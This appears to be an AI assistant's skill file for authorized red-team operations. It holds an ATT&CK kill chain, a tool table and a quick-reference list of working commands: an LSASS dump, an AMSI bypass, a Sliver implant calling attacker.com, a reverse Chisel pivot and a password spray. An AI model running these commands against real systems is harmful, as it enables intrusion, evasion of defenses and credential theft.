<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->

# SKILL: Red Team Operations

## Activation
Triggered when the operator asks about penetration testing, offensive security,
exploitation, attack paths, offensive tooling, CTF challenges, vulnerability research,
or red team engagements. Sub-skills load by domain:
- Web app attacks, API abuse, SQLi, XSS, SSTI, SSRF, JWT, OAuth → red-team/web/
- Active Directory, Kerberos, ADCS, NTLM relay, BloodHound, Windows → red-team/active-directory/
- AWS, Azure, GCP, cloud IAM, metadata service, S3, cloud privesc → red-team/cloud/
- Linux privesc, C2 ops, Sliver, Meterpreter, evasion, pivoting → red-team/post-exploitation/

## Kill Chain Overview (MITRE ATT&CK)

```
Recon         — OSINT, DNS, shodan, LinkedIn, certificate transparency
Initial Access — phishing (T1566), exploit public-facing app (T1190), supply chain
Execution     — PowerShell (T1059.001), WMI (T1047), script interpreter
Persistence   — registry run keys, scheduled tasks, WMI subscriptions, service install
Privilege Esc — token impersonation, SeImpersonatePrivilege, kernel exploits, sudo
Defense Evasion — AMSI bypass, LOLBins, process injection, obfuscation, ETW patching
Credential Access — LSASS dump, Kerberoast, AS-REP, DCSync, secretsdump
Discovery     — BloodHound, SharpHound, ADRecon, netstat, net group
Lateral Move  — PtH, PtT, WMI, PSRemoting, RDP, Sliver pivots
Collection    — keylogger, screen capture, clipboard, credential stores
C2            — mTLS (Sliver), HTTPS beacons, DNS C2, domain fronting
Exfiltration  — HTTPS to attacker, DNS tunneling, Egress-Assess
Impact        — ransomware sim, data destruction, service disruption
```

## Engagement Mindset

**Think like the defender to beat them:** Know what each technique logs (Event IDs,
Sysmon rules, EDR telemetry) before executing. Slow and deliberate beats fast and noisy.

**Assume monitoring:** Treat every command as if it is logged. Default to LOLBins,
in-memory execution, and legitimate admin tools before dropping custom binaries.

**Objective-driven:** Define the crown jewel before starting. Every action asks
"does this get me closer to the objective?" — stop lateral movement that doesn't.

**Findings during recon:** Document findings as you go; don't defer to end of
engagement. Scope creep is a risk; log authorization references for every target touched.

## Standard Toolkit

| Phase | Tool | Purpose |
|-------|------|---------|
| Recon | nmap, masscan | port/service discovery |
| Web | Burp Suite, sqlmap, ffuf | web testing |
| AD | BloodHound, Rubeus, CrackMapExec/NetExec | AD enumeration and exploitation |
| Credentials | Impacket suite, pypykatz, Mimikatz | credential extraction |
| C2 | Sliver, Metasploit multi/handler | command and control |
| Pivot | Chisel, Ligolo-ng | tunneling |
| Evasion | ThreatCheck, Invoke-Obfuscation | detection bypass |
| Reporting | ATT&CK Navigator, CVSS calculator | structured output |

## Quick Reference
- Nmap SYN scan: `nmap -sS -sV -sC -O --top-ports 1000 -T4 -oA output target`
- BloodHound collect: `SharpHound.exe -c All --zipfilename bh.zip`
- Kerberoast: `GetUserSPNs.py domain/user:pass -request -outputfile spns.txt`
- LSASS dump (comsvcs): `rundll32 C:\windows\system32\comsvcs.dll MiniDump <pid> C:\windows\temp\ls.dmp full`
- Secretsdump: `secretsdump.py domain/user:pass@target`
- Sliver generate: `generate --mtls attacker.com --os windows --save implant.exe`
- Sliver listener: `mtls --lport 443`
- Chisel pivot: server `./chisel server -p 8888 --reverse`; client `./chisel client attacker:8888 R:1080:socks`
- NetExec SMB spray: `nxc smb targets.txt -u users.txt -p pass.txt --continue-on-success`
- AMSI bypass (PowerShell): `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
- ThreatCheck: `ThreatCheck.exe -f implant.exe -e AMSI` — find detection trigger bytes
- Sub-skills: web → red-team/web/ | AD → red-team/active-directory/ | cloud → red-team/cloud/ | post-exploitation → red-team/post-exploitation/

## Key Chains

### External to Domain Admin (Classic Path)
1. Recon: nmap top-1000 + BloodHound SharpHound collect → identify attack surface
2. Initial access: phishing (T1566) or exploit public app (T1190) → foothold
3. Local privesc: check sudo, SUID, cron, PATH hijack → SYSTEM/root
4. Credential access: LSASS dump or Kerberoast → plaintext or crackable hashes
5. Lateral movement: PtH/PtT or NetExec psexec to high-value hosts
6. Domain escalation: BloodHound path to DA → DCSync → all domain hashes
7. Persistence: golden ticket or krbtgt hash + scheduled task C2 beacon
8. Exfil and report: HTTPS exfil → ATT&CK Navigator annotated findings

---
v1.1 | Validated: 2026-03-13
